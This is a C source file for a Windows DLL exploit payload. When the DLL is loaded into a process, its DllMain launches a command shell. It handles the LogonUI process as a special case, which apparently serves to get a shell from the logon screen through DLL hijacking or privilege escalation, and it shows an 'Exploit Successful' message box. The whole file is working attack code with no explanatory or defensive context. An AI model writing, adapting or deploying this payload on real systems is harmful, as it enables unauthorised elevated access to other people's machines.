#include <windows.h>

#pragma comment(lib, "USER32")

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    CHAR Command[] = "cmd";
    CHAR ModulePath[MAX_PATH];
    CHAR ModuleName[MAX_PATH];
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&ModulePath, sizeof(ModulePath));
    ZeroMemory(&ModuleName, sizeof(ModuleName));
    si.cb = sizeof si;

    // Learn what process we've loaded into, in case we need it.
    if (GetModuleFileNameA(NULL, ModulePath, sizeof ModulePath)) {
        _splitpath(ModulePath, NULL, NULL, ModuleName, NULL);
    }

    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            // attach to process
            if (CreateProcess(NULL, Command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {

                // LogonUI acts strangely if we try to ExitProcess()
                if (stricmp(ModuleName, "LOGONUI") == 0) {
                    WaitForSingleObject(pi.hProcess, INFINITE);
                    TerminateProcess(GetCurrentProcess(), 0);
                }

                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            } else {
                MessageBox(NULL, "Exploit Successful", "Exploit", MB_OK);
            }

            ExitProcess(0);
            break;
        case DLL_PROCESS_DETACH:
            // detach from process
            break;

        case DLL_THREAD_ATTACH:
            // attach to thread
            break;

        case DLL_THREAD_DETACH:
            // detach from thread
            break;
    }
    return TRUE; // succesful
}
